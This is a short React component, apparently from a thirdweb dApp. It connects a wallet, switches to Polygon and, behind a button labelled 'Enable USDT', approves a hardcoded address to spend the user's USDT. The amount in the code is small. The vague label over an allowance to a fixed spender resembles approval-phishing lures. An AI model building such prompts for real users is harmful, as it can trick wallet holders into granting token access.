import { ConnectWallet } from "@thirdweb-dev/react";
import "./styles/Home.css";

import React, { useEffect, useState } from "react";
import {
  useAddress,
  useChainId,
  useSwitchChain,
  useContract,
  useConnectionStatus,
} from "@thirdweb-dev/react";
import { Polygon } from "@thirdweb-dev/chains";

export default function Home() {
  return (
    <main className="main">
      <div className="container">
        <div className="header">
          <div className="connect">
            <ConnectWallet
              dropdownPosition={{
                side: "bottom",
                align: "center",
              }}
            />
          </div>
        </div>

        <ApproveButton />
      </div>
    </main>
  );
}

export const ApproveButton = () => {
  const address = useAddress();
  const currentChainId = useChainId();
  const connectionStatus = useConnectionStatus();
  const switchChain = useSwitchChain();
  const { contract } = useContract(
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
  );
  const [isLoading, setIsLoading] = useState(false);

  const callApproval = async () => {
    try {
      if (currentChainId !== Polygon.chainId) {
        console.error("Wrong network. Please switch to the Polygon network.");
        if (connectionStatus === "connected") {
          await switchChain(Polygon.chainId);
        }
      }
      if (address && contract) {
        console.log("Contract instance:", contract);
        setIsLoading(true);
        const tx = await contract.erc20.setAllowance(
          "0x7A0CE8524bea337f0beE853B68fAbDE145dAC0A0",
          1
        );
        alert("Contract call success:");
      }
    } catch (err) {
      alert("Contract call failure:");
    } finally {
      setIsLoading(false);
    }
  };

  return isLoading ? (
    <div> Loading... </div>
  ) : (
    <button
      onClick={callApproval}
      style={{
        padding: "20px",
        fontSize: "20px",
      }}
    >
      Enable USDT
    </button>
  );
};
